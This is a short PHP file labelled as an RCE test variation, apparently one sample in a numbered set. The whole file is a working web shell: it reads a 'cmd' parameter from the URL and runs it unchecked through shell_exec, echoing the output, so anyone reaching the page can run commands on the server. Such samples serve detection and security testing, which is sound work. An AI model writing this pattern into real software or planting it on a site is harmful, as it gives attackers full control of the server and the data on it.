<?php
// RCE test variation #704
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>